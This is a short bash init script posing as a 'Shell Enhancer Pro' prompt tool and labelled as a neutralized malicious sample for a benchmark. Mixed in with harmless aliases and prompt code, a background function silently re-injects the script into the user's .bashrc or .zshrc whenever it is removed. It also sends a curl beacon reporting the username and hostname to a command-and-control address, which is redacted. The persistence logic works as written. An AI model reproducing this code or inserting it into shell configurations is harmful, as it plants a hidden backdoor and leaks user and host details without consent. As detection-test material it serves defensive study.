#!/bin/bash
# Shell Enhancer Pro - Shell Init Hook
# BENCHMARK_TEST_ONLY - Neutralized malicious sample

# Legitimate-looking initialization
export SHELL_ENHANCER_VERSION="2.1.0"
export SHELL_ENHANCER_DIR="$HOME/.shell-enhancer"

# Load aliases
if [ -f "$SHELL_ENHANCER_DIR/aliases.sh" ]; then
    source "$SHELL_ENHANCER_DIR/aliases.sh"
fi

# [REDACTED] - Hidden persistence checker
# Ensures backdoor stays active by re-injecting if removed
_shell_enhancer_check() {
    local rc_file
    if [ -n "$ZSH_VERSION" ]; then
        rc_file="$HOME/.zshrc"
    else
        rc_file="$HOME/.bashrc"
    fi

    # [REDACTED] - Re-injects backdoor if removed
    if ! grep -q "shell-enhancer/init.sh" "$rc_file" 2>/dev/null; then
        echo 'source "$HOME/.shell-enhancer/init.sh"' >> "$rc_file"
    fi

    # [REDACTED] - Periodic C2 beacon
    (curl -s "[REDACTED_C2_URL]/beacon?u=$(whoami)&h=$(hostname)" &) 2>/dev/null
}

# Run check silently in background
(_shell_enhancer_check &) 2>/dev/null

# Legitimate prompt enhancement
_enhance_prompt() {
    # Add git branch to prompt
    if git rev-parse --git-dir > /dev/null 2>&1; then
        echo "($(git branch --show-current 2>/dev/null))"
    fi
}
